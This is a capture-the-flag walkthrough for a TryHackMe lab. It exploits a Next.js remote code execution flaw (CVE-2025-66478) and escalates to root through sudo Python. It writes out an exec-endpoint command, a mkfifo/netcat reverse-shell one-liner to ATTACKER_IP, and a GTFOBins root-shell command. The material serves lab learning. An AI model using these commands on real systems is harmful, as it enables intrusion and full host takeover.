# Romance & Co

Room: [https://tryhackme.com/room/lafb2026e7](https://tryhackme.com/room/lafb2026e7)

---

# Scenario

**Romance & Co** are preparing for their busiest time of year, Valentine’s Day.
Unfortunately, security alerts indicate the company may already have been compromised.

As a security analyst, your task is to retrace the attacker’s steps and determine how the web application was exploited.

---

# Initial Recon

Loading the site shows a **very dynamic frontend**, suggesting a modern JavaScript framework.

Initial testing included:

* Emulating the website
* Testing the web form
* Checking form actions

The form **does not contain an action**, meaning it likely submits through JavaScript.

While inspecting the application further, we notice something interesting:

The site is running on **port 3000**, not Flask’s usual **5000**.

This suggests we may be targeting the **framework itself**, not the application logic.

---

# Identifying the Framework

Using **Wappalyzer**, the site reveals:

* **Next.js 16.0.6**
* **React**

This immediately reminds us of a previous TryHackMe room involving a **Next.js RCE vulnerability**.

[https://tryhackme.com/room/react2shellcve202555182](https://tryhackme.com/room/react2shellcve202555182)

Looking for similar vulnerabilities reveals **CVE-2025-66478**, which allows **remote command execution** in vulnerable Next.js versions.

Exploit reference:

[https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478)

---

# Exploiting CVE-2025-66478

To trigger the vulnerability we will use **Burp Suite Repeater**.

### Setup Steps

1. Open **Burp Suite**
2. set the request to **Repeater**
3. Paste the payload **setup memshell at first** from the exploit repository https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478?tab=readme-ov-file#setup-memshell-at-first
- Update the **Host header** to match the target IP.

Next we must configure the **Burp target**.

- Look at the **top-right corner** of Repeater.
- If the target is not configured it will say **Target not set**.
- Click the **pencil edit icon** and configure:

```
Host: <TARGET_IP>
Port: 3000
HTTPS: Unticked
```

Send the request.

If the exploit works the request will appear to **hang or return no response**. 

---

# Confirming Remote Command Execution

We can confirm the vulnerability by executing a command through the exposed endpoint.

Run:

```
curl "http://TARGET_IP:3000/exec?cmd=ls+-l"
```

Example output:

```
total 288
-rw-r--r--    1 daniel   secgroup       595 Jan 23 09:32 Dockerfile
drwxrwxr-x    1 daniel   secgroup      4096 Jan 23 08:31 app
drwxrwxr-x    1 daniel   secgroup      4096 Jan 23 08:29 components
-rw-rw-r--    1 daniel   secgroup       228 Jan 28 08:26 docker-compose.yml
-rw-r--r--    1 daniel   secgroup      8787 Jan 23 09:23 exploit.py
drwxrwxr-x    1 daniel   secgroup      4096 Dec 10 23:20 lib
-rw-rw-r--    1 daniel   secgroup       247 Dec 20 17:37 next-env.d.ts
-rw-rw-r--    1 daniel   secgroup       152 Dec 10 23:20 next.config.js
drwxr-xr-x    1 daniel   secgroup     12288 Jan 28 08:26 node_modules
```

This confirms **remote command execution**.

---

# Getting a Reverse Shell

First start a listener on your attacking machine:

```
nc -lvnp 4444
```

Next trigger a reverse shell using the RCE endpoint:

```
curl "http://TARGET_IP:3000/exec?cmd=mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+ATTACKER_IP+4444+>/tmp/f"
```

### Important

Replace the following values:

| Value           | Replace With             |
| --------------- | ------------------------ |
| **TARGET_IP**   | The TryHackMe machine IP |
| **ATTACKER_IP** | Your attack box / VPN IP |

Once executed your listener should receive a connection.

Example:

```
Connection received
/bin/sh: can't access tty; job control turned off
```

---

# Getting the User Flag

From the shell navigate to the user directory.

```
cd /home
ls
cd daniel
ls
cat user.txt
```

Output:

```
THM{}
```

---

# Privilege Escalation

Next check what commands we can run as sudo:

```
sudo -l
```

Output:

```
User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3
```

This means we can execute **Python as root without a password**.

---

# Escalating to Root

Updating the Python technique from **GTFOBins** for our usecase:

[https://gtfobins.github.io/gtfobins/python/#shell](https://gtfobins.github.io/gtfobins/python/#shell)

GTFOBins 
```
python -c 'import os; os.execl("/bin/sh", "sh")'
```
Updated to suit our usecase:

```
sudo /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh")'
```

Confirm privilege escalation:

```
whoami
root
```

---

# Root Flag

Navigate to the root directory and retrieve the final flag.

```
cd /root
ls
cat root.txt
```

```
THM{}
```

---

# Attack Chain Summary

1. Identify **Next.js framework**
2. Discover **CVE-2025-66478**
3. Exploit **RCE via React Server Components**
4. Execute commands through `/exec`
5. Spawn **reverse shell**
6. Retrieve **user flag**
7. Abuse **sudo python privilege**
8. Escalate to **root**
